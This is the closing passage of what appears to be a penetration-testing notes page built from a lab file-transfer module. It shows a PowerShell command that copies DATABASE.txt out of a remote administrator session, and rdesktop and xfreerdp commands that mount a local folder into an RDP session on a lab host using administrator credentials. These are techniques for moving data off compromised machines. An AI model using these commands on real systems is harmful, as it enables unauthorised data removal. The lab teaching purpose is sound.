+<p>Copy DATABASE.txt from DATABASE01 Session to our Localhost
+<div class="highlight"><pre><span></span><code><span class="nb">Copy-Item</span> <span class="n">-Path</span> <span class="s2">&quot;C:\Users\Administrator\Desktop\DATABASE.txt&quot;</span> <span class="n">-Destination</span> <span class="n">C</span><span class="p">:\</span> <span class="n">-FromSession</span> <span class="nv">$Session</span>
+</code></pre></div></p>
+<h4 id="rdp"><span class="red-command">RDP</span></h4>
+<p><code>rdesktop</code> or <code>xfreerdp</code> can be used to expose a local folder in the remote RDP session.</p>
+<p>Mounting a Linux Folder Using rdesktop
+<div class="highlight"><pre><span></span><code>rdesktop<span class="w"> </span><span class="m">10</span>.10.10.132<span class="w"> </span>-d<span class="w"> </span>HTB<span class="w"> </span>-u<span class="w"> </span>administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Password0@&#39;</span><span class="w"> </span>-r<span class="w"> </span>disk:linux<span class="o">=</span><span class="s1">&#39;/home/user/rdesktop/files&#39;</span>
+</code></pre></div></p>
+<p>Mounting a Linux Folder Using xfreerdp
+<div class="highlight"><pre><span></span><code>xfreerdp<span class="w"> </span>/v:10.10.10.132<span class="w"> </span>/d:HTB<span class="w"> </span>/u:administrator<span class="w"> </span>/p:<span class="s1">&#39;Password0@&#39;</span><span class="w"> </span>/drive:linux,/home/plaintext/htb/academy/filetransfer
+</code></pre></div></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../services/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Services">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256l137.3-137.4c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Services
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../../devops/" class="md-footer__link md-footer__link--next" aria-label="Next: DevOps">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                DevOps
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.action.edit", "content.action.view", "content.code.annotate", "content.code.copy", "content.tooltips", "navigation.instant", "navigation.instant.prefetch", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.tabs.sticky", "navigation.path", "navigation.top", "search.highlight", "search.suggest", "toc.follow", "header.autohide"], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
+      
+    
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
